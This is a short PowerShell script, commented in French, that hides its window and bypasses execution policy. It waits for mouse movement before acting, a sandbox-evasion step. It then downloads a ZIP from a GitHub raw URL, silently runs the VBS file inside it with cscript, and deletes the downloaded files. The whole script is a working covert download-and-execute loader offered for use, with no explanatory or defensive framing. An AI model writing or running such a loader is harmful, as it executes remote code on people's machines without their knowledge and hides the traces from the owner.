# Masquer la fenêtre PowerShell en utilisant Start-Process
$script = {
    # Détection du mouvement de la souris
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Mouse {
            [DllImport("user32.dll")]
            public static extern bool GetCursorPos(ref System.Drawing.Point lpPoint);
        }
"@
    $lastPos = New-Object System.Drawing.Point
    $currentPos = New-Object System.Drawing.Point

    while ($true) {
        [Mouse]::GetCursorPos([ref]$currentPos)
        if ($currentPos -ne $lastPos) {
            # Si un mouvement de souris est détecté, commencer l'exécution
            break
        }
        $lastPos = $currentPos
        Start-Sleep -Seconds 1
    }

    # Une fois le mouvement détecté, télécharger et exécuter le script
    # Chemin temporaire pour stocker le fichier ZIP
    $tempZipPath = "$env:TEMP\Goose.zip"
    $tempExtractPath = "$env:TEMP\Goose"

    # Téléchargement du fichier ZIP depuis l'URL
    Invoke-WebRequest -Uri "https://github.com/ertvg/h/raw/main/Goose.zip" -OutFile $tempZipPath

    # Extraction du fichier ZIP
    Expand-Archive -Path $tempZipPath -DestinationPath $tempExtractPath

    # Chemin du fichier VBS à exécuter
    $vbsFilePath = "$tempExtractPath\Goose.vbs"

    # Vérifier si le fichier VBS existe
    if (Test-Path $vbsFilePath) {
        # Exécution du fichier VBS
        cscript.exe //B //Nologo $vbsFilePath
    } else {
        Write-Host "Le fichier Goose.vbs n'a pas été trouvé."
    }

    # Optionnel: Supprimer les fichiers temporaires après exécution
    Remove-Item -Path $tempZipPath -Force
    Remove-Item -Path $tempExtractPath -Recurse -Force
}

# Exécuter le script PowerShell en arrière-plan sans afficher la fenêtre
Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command & {$($script)}" -WindowStyle Hidden
